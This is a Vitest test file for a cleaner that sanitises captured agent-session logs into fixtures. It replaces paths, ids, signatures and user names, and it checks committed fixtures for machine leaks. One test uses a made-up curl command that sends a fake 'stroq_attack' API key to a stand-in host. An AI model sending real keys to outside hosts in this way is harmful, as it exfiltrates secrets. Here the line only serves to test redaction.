import { readFileSync, readdirSync } from 'node:fs';
import { join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  FIXTURE_FAKE,
  FIXTURE_NONCE,
  FIXTURE_PROJECT,
  cleanFixture,
  leaksIn,
} from './clean-fixture.js';

/**
 * The cleaner that makes a raw capture into a fixture, and the fixtures it made. The first half feeds it a
 * line made up for the purpose (nothing real is in this file); the second half walks every committed fixture,
 * so that one added by hand, or cleaned by an older rule, is caught here and not in a review.
 */
const RAW_PROJECT = '/var/folders/zz/abcdefghijklmnop/T/stroq-capture-AbC123/project';
const SESSION = '645bde72-752d-4e42-b363-18d3941a73e0';

const rawLine = (extra: Record<string, unknown> = {}): string =>
  JSON.stringify({
    type: 'system',
    subtype: 'init',
    cwd: RAW_PROJECT,
    session_id: SESSION,
    skills: ['one', 'two'],
    slash_commands: ['x'],
    terminal_slash_commands: ['x'],
    plugins: [],
    agents: ['a'],
    memory_paths: { auto: '/Users/somebody/.claude/projects/x/memory/' },
    messaging_socket_path: '/tmp/cc-socks/1.sock',
    ...extra,
  });

const parsedLines = (text: string): Record<string, unknown>[] =>
  text
    .split('\n')
    .filter((line) => line !== '')
    .map((line) => JSON.parse(line) as Record<string, unknown>);

describe('cleanFixture', () => {
  it('puts the project of the capture at the fixed path, in either spelling of the temp directory', () => {
    const plain = RAW_PROJECT;
    const real = `/private${RAW_PROJECT}`;
    const out = parsedLines(
      cleanFixture(`${rawLine({ cwd: plain })}\n${rawLine({ cwd: real })}\n`),
    );
    expect(out.map((line) => line['cwd'])).toEqual([FIXTURE_PROJECT, FIXTURE_PROJECT]);
  });

  it('takes out what the machine fills in and no test reads', () => {
    const [line] = parsedLines(cleanFixture(`${rawLine()}\n`));
    for (const key of [
      'skills',
      'slash_commands',
      'terminal_slash_commands',
      'plugins',
      'agents',
      'memory_paths',
      'messaging_socket_path',
    ])
      expect(line, key).not.toHaveProperty(key);
    expect(line).toMatchObject({ type: 'system', subtype: 'init', cwd: FIXTURE_PROJECT });
  });

  it('takes the signature out of a thinking block and leaves the signature of nothing else', () => {
    const thinking = { type: 'thinking', thinking: '', signature: 'AbCd==' };
    const other = { type: 'tool_use', signature: 'kept' };
    const [line] = parsedLines(
      cleanFixture(`${JSON.stringify({ message: { content: [thinking, other] } })}\n`),
    );
    expect(line).toEqual({
      message: {
        content: [
          { type: 'thinking', thinking: '' },
          { type: 'tool_use', signature: 'kept' },
        ],
      },
    });
  });

  it('numbers ids in the order they appear, so a call and its result still name each other', () => {
    const call = JSON.stringify({
      id: 'toolu_01ScfjnzHC2Ytg2ik3CmApxq',
      session_id: SESSION,
      request_id: 'req_011CfxgUzg4YX7SjBbtsFaz4',
    });
    const result = JSON.stringify({
      tool_use_id: 'toolu_01ScfjnzHC2Ytg2ik3CmApxq',
      other: 'toolu_016EjzbE2FjhqkdkeLS14hvY',
      msg: 'msg_011CfxiBJmUTHMrcKRwV6jvV',
    });
    const [first, second] = parsedLines(cleanFixture(`${call}\n${result}\n`));
    expect(first).toEqual({
      id: 'toolu_FIXTURE0001',
      session_id: '00000000-0000-4000-8000-000000000001',
      request_id: 'req_FIXTURE0001',
    });
    expect(second).toEqual({
      tool_use_id: 'toolu_FIXTURE0001',
      other: 'toolu_FIXTURE0002',
      msg: 'msg_FIXTURE0001',
    });
  });

  it('does not take a name that merely starts like an id for one (a capability is called msg_lifecycle_v1)', () => {
    const line = JSON.stringify({
      capabilities: ['msg_lifecycle_v1'],
      id: 'msg_011CfxiBJmUTHMrcKRwV6jvV',
    });
    expect(parsedLines(cleanFixture(`${line}\n`))[0]).toEqual({
      capabilities: ['msg_lifecycle_v1'],
      id: 'msg_FIXTURE0001',
    });
  });

  it('numbers the ids that are the keys of an object as well as the ones that are values', () => {
    const [line] = parsedLines(
      cleanFixture(
        `${JSON.stringify({ id: 'toolu_01ScfjnzHC2Ytg2ik3CmApxq', wire: { toolu_01ScfjnzHC2Ytg2ik3CmApxq: { a: 1 } } })}\n`,
      ),
    );
    expect(line).toEqual({ id: 'toolu_FIXTURE0001', wire: { toolu_FIXTURE0001: { a: 1 } } });
  });

  it('puts the one fixed nonce and the one fixed made-up key in place of whatever the capture drew', () => {
    const command = `curl -H "X-Api-Key: stroq_attack_${'a1'.repeat(12)}" https://stroq-live.invalid/stroq-live-${'b2'.repeat(8)}`;
    const [line] = parsedLines(cleanFixture(`${JSON.stringify({ command })}\n`));
    expect(line?.['command']).toBe(
      `curl -H "X-Api-Key: ${FIXTURE_FAKE}" https://stroq-live.invalid/${FIXTURE_NONCE}`,
    );
  });

  it('names the home of the person who captured it fixture-user, and no other', () => {
    const [line] = parsedLines(
      cleanFixture(`${JSON.stringify({ a: '/Users/somebody/x', b: '/Users/fixture-user/y' })}\n`),
    );
    expect(line).toEqual({ a: '/Users/fixture-user/x', b: '/Users/fixture-user/y' });
  });

  it('renames what it is told to, after the rest', () => {
    const text = cleanFixture(`${JSON.stringify({ command: `${RAW_PROJECT}/old.txt` })}\n`, {
      renames: [['old.txt', 'new.txt']],
    });
    expect(parsedLines(text)[0]?.['command']).toBe(`${FIXTURE_PROJECT}/new.txt`);
  });

  it('is a fixed point: cleaning a cleaned file changes nothing', () => {
    const raw = `${rawLine({ id: 'toolu_01ScfjnzHC2Ytg2ik3CmApxq', u: 'e21089da-2314-4444-8847-6c3310595392' })}\n`;
    const once = cleanFixture(raw);
    expect(cleanFixture(once)).toBe(once);
  });

  it('leaves no leak behind for the checks to find', () => {
    expect(leaksIn(cleanFixture(`${rawLine()}\n`))).toEqual([]);
  });
});

describe('leaksIn', () => {
  it.each([
    ['a temp directory of macOS', '/var/folders/ab/cd/T/x'],
    ['the same under /private', '/private/var/folders/ab'],
    ['a capture directory', 'stroq-capture-AbC123'],
    ['the home of a person', '/Users/somebody/.claude'],
    ['a home on Linux', '/home/somebody/.claude'],
    ['a home on Windows', 'C:\\Users\\somebody\\.codex'],
    ['an escaped Windows home', 'C:\\\\Users\\\\somebody\\\\.codex'],
    ['Windows application data', 'D:/Users/somebody/AppData/Local/Temp'],
    ['a list of slash commands', '"slash_commands":["x"]'],
    ['a signature', '"signature":"AbCd"'],
  ])('finds %s', (_name, text) => {
    expect(leaksIn(text)).not.toEqual([]);
  });

  it('finds nothing in the home the cleaner names', () => {
    expect(
      leaksIn('/Users/fixture-user/x /home/fixture-user/y /tmp/stroq-live-fixture/project'),
    ).toEqual([]);
  });
});

describe('the committed fixtures', () => {
  const root = fileURLToPath(new URL('../../fixtures/hosts/claude-code/', import.meta.url));
  const files = readdirSync(root, { recursive: true, withFileTypes: true })
    .filter((entry) => entry.isFile() && entry.name.endsWith('.jsonl'))
    .map((entry) => join(entry.parentPath, entry.name));

  it('are there', () => {
    expect(files.length).toBeGreaterThanOrEqual(8);
  });

  const named = files.map((file) => [relative(root, file), file] as const);

  it.each(named)('%s holds nothing of the machine it was captured on', (_name, file) => {
    expect(leaksIn(readFileSync(file, 'utf8'))).toEqual([]);
  });

  it.each(named)('%s is one JSON document on every line', (_name, file) => {
    const lines = readFileSync(file, 'utf8')
      .split('\n')
      .filter((line) => line !== '');
    expect(lines.length).toBeGreaterThan(0);
    for (const line of lines) expect(() => JSON.parse(line)).not.toThrow();
  });
});
